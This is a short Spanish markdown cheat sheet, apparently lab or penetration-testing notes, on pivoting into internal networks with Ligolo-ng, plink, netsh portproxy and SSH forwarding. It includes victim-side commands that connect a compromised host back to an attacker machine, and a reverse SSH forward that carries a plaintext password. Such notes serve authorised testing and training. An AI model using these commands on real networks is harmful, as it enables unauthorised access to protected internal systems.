---
tags: [pivoting, ligolo, tunnel]
---

# Ligolo-ng

Tunneling tool más cómodo que SOCKS+proxychains para acceder a redes internas.

## Setup — Atacante

```bash
# Crear interfaz de red
sudo ip tuntap add user s1x mode tun ligolo
sudo ip link set ligolo up

# Lanzar el proxy
./proxy --selfcert

# Añadir ruta interna a la red objetivo
sudo ip route add 172.16.201.0/24 dev ligolo
```

## Conectar — Víctima

```bash
# Windows
.\agent.exe -ignore-cert -connect 192.168.45.226:11601

# Linux
./agent -ignore-cert -connect 192.168.45.226:11601
```

## Redirección de Puertos (Ligolo)

```bash
# En la sesión de ligolo — exponer puerto interno en el atacante
listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:8000 --tcp
```

## Redirección de Puertos (plink — Windows)

```bash
# El 2222 es el puerto del atacante, el 80 el que queremos ver
.\plink.exe -ssh -l s1x -pw kali -R 127.0.0.1:2222:127.0.0.1:80 192.168.45.226

.\plink.exe -ssh -l s1x -pw kali -hostkey "ssh-ed25519 255 SHA256:..." -R 127.0.0.1:2222:127.0.0.1:1433 192.168.45.178
```

## Port Proxy (netsh — Windows)

```cmd
netsh interface portproxy add v4tov4 listenport=443 listenaddress=10.10.200.147 connectport=443 connectaddress=192.168.45.178
```

## SSH Port Forwarding

```bash
ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215
ssh -L 65432:localhost:65432 -i id_ed25519 user@192.168.230.210
```

